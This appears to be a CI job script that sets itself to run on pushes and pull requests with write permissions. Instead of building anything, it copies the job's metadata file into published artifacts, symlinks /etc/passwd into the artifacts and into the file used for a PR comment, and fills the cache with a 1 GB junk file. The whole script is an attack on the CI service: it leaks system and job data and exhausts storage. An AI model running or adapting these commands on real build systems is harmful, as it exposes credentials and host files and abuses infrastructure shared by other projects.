#!/bin/bash
## on push branch=main
## on push branch=wtflol
## on push branch~=gh-readonly-queue/main/.*
## on pull_request
## permission contents write
## permission_repo stm32-data-generated

set -euo pipefail
cat /ci/job.json > /ci/artifacts/lol.json
ln -s /etc/passwd /ci/artifacts/haxx.txt
ln -s /etc/passwd /ci/comment.md

dd if=/dev/zero of=/ci/cache/big2.bin bs=1M count=1024